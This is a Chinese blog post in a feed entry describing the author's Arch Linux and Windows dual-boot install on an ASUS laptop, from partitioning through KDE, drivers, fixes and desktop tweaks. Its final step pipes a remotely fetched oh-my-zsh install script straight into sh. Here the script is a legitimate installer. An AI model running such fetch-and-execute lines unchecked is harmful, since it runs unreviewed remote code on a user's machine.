    <title>【ARCH.0x00】从零开始的 Arch Linux 生活</title>
    <link href="https://arttnba3.github.io/2023/09/25/ARCH-0X00-INSTALL_ARCH_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/09/25/ARCH-0X00-INSTALL_ARCH_WINDOWS/</id>
    <published>2023-09-24T15:25:17.000Z</published>
    <updated>2023-09-24T17:38:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>不好用，在安装界面睡了三个小时</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>本科阶段笔者一直用的 Windows 作为主力系统并使用 VMWare Workstation 运行 Linux 虚拟机，但总感觉不够得劲，可惜笔者有一些硬性需求只能在 Windows 上完成（比如说游戏、绘图等），由于仅有一台电脑的缘故，所以一直没有机会在真机上安装 Linux 操作系统 ：(</p><p>开始读 Phd 之后老板比较阔气大手一挥直接配了一个新的笔记本用来工作，于是笔者决定这一次直接在真机上安装 Linux ，专门用来做工作上的事情</p><p>关于发行版的选择，笔者决定选择安装 <a href="https://archlinux.org/">Arch Linux</a>，因为其有着较为完备的各类文档及驱动适配等，同时笔者的新笔记本的牌子为华硕，其同样有一个较为完善的<a href="https://asus-linux.org/">第三方社区</a>支持</p><p>不过考虑到有些工作可能还是在 Windows 上做会比较方便（例如调试 Windows 程序），再加上原装的 Windows 系统毕竟是收了笔者的钱的，直接抹掉的话未免有点可惜（笑），所以笔者最终的策略是<strong>安装 Windows + Linux 双系统，日常主力还是使用 Linux 系统</strong></p><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><h3 id="制作-Arch-Linux-物理安装媒介"><a href="#制作-Arch-Linux-物理安装媒介" class="headerlink" title="制作 Arch Linux 物理安装媒介"></a>制作 Arch Linux 物理安装媒介</h3><p>首先在 <a href="https://archlinux.org/download/">https://archlinux.org/download/</a> 下载最新的 Arch Linux 镜像，这里提供了几个镜像站，可以直接选离你最近的那一个：）</p><p>完成镜像下载之后直接烧录到 U 盘上即可，这里笔者用的是 <a href="https://etcher.balena.io/">balenaEtcher</a> ：</p><p><img src="https://s2.loli.net/2023/09/18/5lqvTSMEXz4xmQr.png"></p><h3 id="关闭-Secure-Boot"><a href="#关闭-Secure-Boot" class="headerlink" title="关闭 Secure Boot"></a>关闭 Secure Boot</h3><p>由于 Arch Linux 的安装媒介暂不支持安全启动，因此这里我们需要将电脑的这个特性暂且关闭</p><p>华硕笔记本进入 BIOS 的方法为：首先摁住 <code>F2</code>，然后按一下开机键，一直到 BIOS 界面出现后松开 <code>F2</code> 即可</p><p>点击 <code>进阶设置→安全性</code>，把 <code>安全启动控制</code> 改为 <code>关闭</code> 即可：</p><p><img src="https://s2.loli.net/2023/09/18/wsMylQKgk9XA4WR.jpg" alt="关闭安全启动"></p><h3 id="分配-Linux-磁盘空间"><a href="#分配-Linux-磁盘空间" class="headerlink" title="分配 Linux 磁盘空间"></a>分配 Linux 磁盘空间</h3><p>直接右键 <code>我的电脑→显示更多选项→管理→磁盘管理</code> 拉一块空的区域出来就行：</p><p><img src="https://s2.loli.net/2023/09/18/tn92KjiBeLA7Zv8.jpg"></p><h1 id="0x02-安装-Arch-Linux"><a href="#0x02-安装-Arch-Linux" class="headerlink" title="0x02. 安装 Arch Linux"></a>0x02. 安装 Arch Linux</h1><blockquote><p>主要还是参照<a href="https://wiki.archlinux.org/title/installation_guide">官方文档</a>来弄</p></blockquote><h3 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h3><p>首先还是进 BIOS 改启动顺序把安装介质调到第一位：</p><p><img src="https://s2.loli.net/2023/09/18/dTlZOjgPWbvE18z.png"></p><p>然后就来到了 <code>GRUB</code>，正常情况下直接选第一个就行：</p><p><img src="https://s2.loli.net/2023/09/18/og6ebnwTvEcGkHs.jpg"></p><p>如果你需要使用无线网络，可以输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">iwctl       <span class="hljs-comment"># 进入无线网络控制界面</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">device list <span class="hljs-comment"># 查看无线网卡信息</span></span><br></code></pre></td></tr></table></figure><p>笔者这里显示的网卡设备名是 <code>wlan0</code> ，接下来输入如下命令扫描附近的的无线网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 scan <span class="hljs-comment"># 扫描</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 get-networks <span class="hljs-comment"># 显示结果</span></span><br></code></pre></td></tr></table></figure><p>接下来使用 <code>connect</code> 参数进行连接，例如这里假设网络名为 <code>BeastSenbei</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 connect BeastSenbei <span class="hljs-comment"># 如果有密码则会要求你输入</span></span><br></code></pre></td></tr></table></figure><p>之后直接输入 <code>exit</code> 即可退出该界面</p><blockquote><p>你可以使用 <code>pacman -Syyy</code> 命令测试网络是否联通，若要换源则直接编辑 <code>/etc/pacman.d/mirrorlist</code> 文件即可</p></blockquote><h3 id="建立磁盘分区"><a href="#建立磁盘分区" class="headerlink" title="建立磁盘分区"></a>建立磁盘分区</h3><p>首先使用 <code>lsblk</code> 查看磁盘分区，这里看不到我们之前新划分的区域，因为还没划分一个新的分区：</p><p><img src="https://s2.loli.net/2023/09/18/ram95FjtBEIuD7p.jpg"></p><p>接下来我们使用如下命令进行新分区的建立，注意根据你自己的磁盘设备名进行输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><p>可以看到一个 <code>Free Space</code>，选中并选择 <code>[New]</code> 即可，默认直接敲两下回车就是用所有的空间，你也可以选择手动输入自己想要划分的分区大小，完成之后在下面选择 <code>[Write]</code> 然后输入 <code>yes</code> 即可：</p><p><img src="https://s2.loli.net/2023/09/18/EX81wkHmfjbWMF6.jpg"></p><p>接下来将该分区格式化为 <code>ext4</code> 格式，这里注意分区别选错了，不记得的就重新再看看 <code>lsblk</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p6</span><br></code></pre></td></tr></table></figure><h3 id="正式安装"><a href="#正式安装" class="headerlink" title="正式安装"></a>正式安装</h3><p>接下来首先挂载新分区，之后在内部创建 <code>/boot</code> 目录，并将 Windows 原有的 EFI 分区挂载到 <code>/boot</code> 目录下，这里注意看自己对应的分区名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p6 /mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/boot</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p1 /mnt/boot</span><br></code></pre></td></tr></table></figure><p>接下来使用该命令进行安装基本的环境，这里笔者安装默认的内核版本 <code>linux</code>，你也可以在 <a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8">Wiki</a> 上选择自己想要的内核（比如说带有安全加固的 <code>linux-hardened</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><p>安装完成之后接下来我们来对系统进行一些基本配置，首先是生成 fstab（文件系统表）文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></code></pre></td></tr></table></figure><p>接下来使用 <code>arch-chroot</code> 命令切换到新的系统环境中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">arch-chroot /mnt</span><br></code></pre></td></tr></table></figure><p>然后是设置时区，笔者现在在墨尔本所以时区设置为墨尔本，如果你在中国大陆则需要设置为 <code>Asia/Shanghai</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>接下来生成 <code>/etc/adjtime</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hwclock --systohc</span><br></code></pre></td></tr></table></figure><p>然后创建主机名，这里就随便了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3-Arch&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>在 <code>/etc/hosts</code> 中写入如下内容，这里注意改成自己的 hostname：</p><p><img src="https://s2.loli.net/2023/09/18/hdjHysTvP8KlqA4.png"></p><p>设置 root 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>安装一些基本的软件包，这里我们选择使用 <code>grub</code> 作为启动器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S grub efibootmgr networkmanager network-manager-applet dialog wireless_tools wpa_supplicant os-prober mtools dosfstools ntfs-3g base-devel linux-headers reflector git sudo vim</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S intel-ucode <span class="hljs-comment"># 如果你是 AMD 则需要改成 amd-ucode</span></span><br></code></pre></td></tr></table></figure><p>配置 GRUB 自动启用 <code>os-prober</code>，这里只需要在 <code>/etc/default/grub</code> 中加入一行 <code>GRUB_DISABLE_OS_PROBER=false</code> ，并输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>到这一步一个基本的 Arch 环境就安装好了，完成之后输入如下命令进行重启进入系统，别忘了拔出移动安装介质：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">exit</span>        <span class="hljs-comment"># 退出 arch-chroot</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">umount -a   <span class="hljs-comment"># 取消分区挂载</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">reboot      <span class="hljs-comment"># 重启</span></span><br></code></pre></td></tr></table></figure><blockquote><p>后面如果想再进入 Windows 只需要进 BIOS 调整启动顺序即可</p></blockquote><h1 id="0x03-常规系统配置"><a href="#0x03-常规系统配置" class="headerlink" title="0x03. 常规系统配置"></a>0x03. 常规系统配置</h1><p>接下来是一些常规系统配置，包括新建用户、配置 GUI 等</p><h3 id="启动网络"><a href="#启动网络" class="headerlink" title="启动网络"></a>启动网络</h3><p>通过如下命令启动网络并连接 WiFi：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>进入这个界面后选 <code>Activate a connection</code>，然后就正常选 WiFi 输密码连接就行，这个只用最开始的时候弄一次：</p><p><img src="https://s2.loli.net/2023/09/18/34f1eJYGojnX2xq.jpg"></p><p>DHCP 相关的一些配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S dhcpcd</span><br></code></pre></td></tr></table></figure><h3 id="bash-自动补全"><a href="#bash-自动补全" class="headerlink" title="bash 自动补全"></a>bash 自动补全</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S bash-completion</span><br></code></pre></td></tr></table></figure><h3 id="设置-Locale-进行本地化"><a href="#设置-Locale-进行本地化" class="headerlink" title="设置 Locale 进行本地化"></a>设置 Locale 进行本地化</h3><p>去掉 <code>/etc/locale.gen</code> 中 <code>en_US.UTF-8</code> 所在行以及 <code>zh_CN.UTF-8</code> 所在行开头的 <code>#</code>，然后在 <code>/etc/locale.conf</code> 中写入一行 <code>LANG=en_US.UTF-8</code> 即可</p><h3 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h3><p>没啥好说的，老一套东西，这里别忘了改成自己的用户名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">useradd -m -s /bin/bash -g arttnba3 arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><p>授予 sudo 权限，这里注意我们<strong>应当且仅应当使用 visudo，而非直接编辑 &#x2F;etc&#x2F;sudoers 文件</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">usermod -aG wheel arttnba3 <span class="hljs-comment"># arch 下的 sudo 组</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim visudo</span><br></code></pre></td></tr></table></figure><p>去掉如下图所示这一行的前面的 <code>#</code> 注释即可，笔者这里是已经修改过后的版本：</p><p><img src="https://s2.loli.net/2023/09/18/dpNtu5qs4hCGSmD.png"></p><h3 id="配置桌面环境"><a href="#配置桌面环境" class="headerlink" title="配置桌面环境"></a>配置桌面环境</h3><p>笔者选择安装 <code>XWayland + KDE Plasma</code>，首先安装基本的 KDE Plasma 桌面组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S plasma-meta konsole dolphin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> sddm</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S egl-wayland kde-applications-meta sway alacritty waybar wofi xorg-xwayland xorg-xlsclients qt5-wayland glfw-wayland</span><br></code></pre></td></tr></table></figure><blockquote><p>这里会有一些不同的 provider 供选择，按自己喜欢的选就好：</p><p><img src="https://s2.loli.net/2023/09/19/XRjHPuoTIzFxUdB.png"></p><p>需要注意的是 KDE <a href="https://community.kde.org/Distributions/Packaging_Recommendations#Non-Plasma_packages">仅推荐VLC后端</a>，因为GStreamer<a href="https://invent.kde.org/libraries/phonon-gstreamer/-/issues/1">不再维护</a>：</p></blockquote><p>之后重启就能进图形化的桌面了，说实话有点丑 ：(</p><p><img src="https://s2.loli.net/2023/09/19/W1q4dgVSibDeF2t.jpg"></p><p>配置默认开启小键盘只需要在 <code>/etc/sddm.conf</code> 文件中添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[General]<br>Numlock=on<br></code></pre></td></tr></table></figure><h3 id="开启-32-位支持库"><a href="#开启-32-位支持库" class="headerlink" title="开启 32 位支持库"></a>开启 32 位支持库</h3><p>将 <code>/etc/pacman.conf</code> 中 <code>[multilib]</code> 所在的那两行开头的 <code>#</code>去掉，然后 <code>pacman -Syyu</code> 即可</p><h3 id="更换包管理器为-AUR"><a href="#更换包管理器为-AUR" class="headerlink" title="更换包管理器为 AUR"></a>更换包管理器为 AUR</h3><p>照着文档做就行，这里笔者就懒得自己编译了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S --needed git base-devel</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://aur.archlinux.org/yay-bin.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> yay-bin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">makepkg -si</span><br></code></pre></td></tr></table></figure><h3 id="禁用-iwd"><a href="#禁用-iwd" class="headerlink" title="禁用 iwd"></a>禁用 iwd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">disable</span> iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl stop iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br></code></pre></td></tr></table></figure><h3 id="基础功能包与中文字体安装"><a href="#基础功能包与中文字体安装" class="headerlink" title="基础功能包与中文字体安装"></a>基础功能包与中文字体安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S sof-firmware alsa-firmware alsa-ucm-conf          <span class="hljs-comment"># 一些可能需要的声音固件</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S adobe-source-han-serif-cn-fonts wqy-zenhei        <span class="hljs-comment"># 开源中文字体</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S noto-fonts-cjk noto-fonts-emoji noto-fonts-extra  <span class="hljs-comment"># 谷歌开源字体及表情</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S ark</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S p7zip unrar unarchiver lzop lrzip                 <span class="hljs-comment"># ark 的可选依赖</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S google-chrome</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S packagekit-qt5 packagekit appstream-qt appstream gwenview wget kate <span class="hljs-built_in">bind</span> <span class="hljs-comment"># 图片查看器和其他工具等</span></span><br></code></pre></td></tr></table></figure><h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><p>笔者用的 fcitx：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-im</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-chinese-addons <span class="hljs-comment"># 中文输入引擎</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-pinyin-zhwiki  <span class="hljs-comment"># 中文维基百科词库</span></span><br></code></pre></td></tr></table></figure><p>之后使用 <code>EDITOR=vim sudoedit /etc/environment</code> 命令在对应文件中添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GTK_IM_MODULE=fcitx<br>QT_IM_MODULE=fcitx<br>XMODIFIERS=@im=fcitx<br>SDL_IM_MODULE=fcitx<br></code></pre></td></tr></table></figure><p>之后在系统设置里便可进行相应的配置</p><h3 id="启用蓝牙并安装蓝牙音频设备"><a href="#启用蓝牙并安装蓝牙音频设备" class="headerlink" title="启用蓝牙并安装蓝牙音频设备"></a>启用蓝牙并安装蓝牙音频设备</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S bluez bluez-utils</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pulseaudio-bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio -k</span><br></code></pre></td></tr></table></figure><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>首先安装 Intel 核显驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></code></pre></td></tr></table></figure><p>如果你和笔者一样还有一张 N 卡则使用如下命令安装驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S nvidia nvidia-settings lib32-nvidia-utils</span><br></code></pre></td></tr></table></figure><blockquote><p>这里笔者没有安装 <code>optimus-manager</code>， 因为一安就进不去桌面了，看了半天日志找了半天解决方案都没能解决（悲）</p><p>因为目前对续航其实没有过于极限的要求，独显集显混合输出的情况下还是能轻度工作3h左右的，因此暂时不考虑继续整这玩意了：）</p></blockquote><h1 id="0x04-桌面美化"><a href="#0x04-桌面美化" class="headerlink" title="0x04. 桌面美化"></a>0x04. 桌面美化</h1><h3 id="启动界面美化"><a href="#启动界面美化" class="headerlink" title="启动界面美化"></a>启动界面美化</h3><p>直接在 <code>System Settings-&gt;Startup and Shutdown-&gt;Login Screen(SDDM)</code> 里就能改，笔者这里直接选了 <code>Breeze</code></p><h3 id="桌面风格美化"><a href="#桌面风格美化" class="headerlink" title="桌面风格美化"></a>桌面风格美化</h3><p>直接在 <code>System Settings-&gt;Appearance-&gt;Global Theme</code> 里选择自己喜欢的主题安装上然后再 apply 就行，或者也可以自己去 <a href="https://store.kde.org/">https://store.kde.org</a> 进行下载，笔者选择的是国人设计师 <a href="https://github.com/vinceliuice">vinceliuice</a> 开发的 <a href="https://github.com/vinceliuice/MacVentura-kde">MacVentura KDE theme</a> 主题</p><h3 id="安装-Dock"><a href="#安装-Dock" class="headerlink" title="安装 Dock"></a>安装 Dock</h3><p>在底下有个 Mac 样式的 Dock 还是相对来说比较养眼一些，这里笔者安装的是 <code>latte-dock</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S latte-dock</span><br></code></pre></td></tr></table></figure><p>然后 <code>alt + f2</code> 输入 <code>latte</code> 就 ok 了</p><p>最后再摆放各种 widgets 调一调 panel 位置啥的差不多就 ok 了，整体效果如下：</p><p><img src="https://s2.loli.net/2023/09/20/3bdIi6KA9c2ulNV.png"></p><h1 id="0x05-一些报错的解决"><a href="#0x05-一些报错的解决" class="headerlink" title="0x05. 一些报错的解决"></a>0x05. 一些报错的解决</h1><h3 id="pcieport-报错"><a href="#pcieport-报错" class="headerlink" title="pcieport 报错"></a>pcieport 报错</h3><p>启动起来发现内核莫名其妙吐了一大堆的奇怪的东西：</p><p><img src="https://s2.loli.net/2023/09/18/m71oVX2g489Or5s.jpg"></p><p>在 <code>/boot/grub/grub.cfg</code> 中找到内核启动参数，添加上 <code>pci=nommconf</code> 即可</p><h3 id="chrome-无法播放视频"><a href="#chrome-无法播放视频" class="headerlink" title="chrome 无法播放视频"></a>chrome 无法播放视频</h3><p>就一直卡在加载界面不动，参见 <a href="https://wiki.archlinux.org/title/PulseAudio/Troubleshooting#Browsers_load_videos_but_do_no_play">Wiki</a> 使用如下命令可以临时解决：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio --<span class="hljs-built_in">kill</span> &amp;&amp; pulseaudio --start</span><br></code></pre></td></tr></table></figure><p>完美的解决方案是是用 <code>pipewire-pulse</code> 替换掉 <code>pluseaudio</code> 与 <code>pluseaudio-bluetooth</code>，然后重启：</p><blockquote><p>安装这个包的时候会自动把另外两个包给卸了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pipewire-pulse</span><br></code></pre></td></tr></table></figure><h1 id="0x06-个人配置优化"><a href="#0x06-个人配置优化" class="headerlink" title="0x06. 个人配置优化"></a>0x06. 个人配置优化</h1><h3 id="触摸板开启点按即单击"><a href="#触摸板开启点按即单击" class="headerlink" title="触摸板开启点按即单击"></a>触摸板开启点按即单击</h3><p>触摸板习惯性的操作应当是按一下就是单击，而非按下机械左键才是单击， KDE 默认是关闭了这个选项，不过我们在系统设置中的 <code>Hardware→Input Devices→Touchpad</code> 里将 <code>Tap-to-click</code> 勾选上即可</p><h3 id="触摸板上下滑动方向改变"><a href="#触摸板上下滑动方向改变" class="headerlink" title="触摸板上下滑动方向改变"></a>触摸板上下滑动方向改变</h3><p>笔者的使用习惯中双指滑动是上下反向，KDE 中默认是上下同向，这里只需要在系统设置中的 <code>Hardware→Input Devices→Touchpad</code> 里将 <code>Invert scroll direction (Natual scrolling)</code> 勾选上即可</p><h3 id="设置双击打开文件"><a href="#设置双击打开文件" class="headerlink" title="设置双击打开文件"></a>设置双击打开文件</h3><p>Dolphin 中默认单击就打开文件了，而对于笔者来说更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><h3 id="使用-zsh-替换-bash"><a href="#使用-zsh-替换-bash" class="headerlink" title="使用 zsh 替换 bash"></a>使用 zsh 替换 bash</h3><p><code>Z Shell</code> 是一个比默认自带的 <code>bash</code> 更加强大的 shell，这里我们通过如下命令即可将当前用户的默认 shell 替换为 zsh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S zsh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><br></code></pre></td></tr></table></figure><p>后面各种主题啥的配置可以参照<a href="https://zhuanlan.zhihu.com/p/58073103">知乎上的这篇文章</a>，笔者用的是 <code>gnzh</code> 主题</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不好用，在安装界面睡了三个小时&lt;/p&gt;</summary>
    
    
    
    <category term="ARCH" scheme="https://arttnba3.github.io/categories/ARCH/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Arch Linux" scheme="https://arttnba3.github.io/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
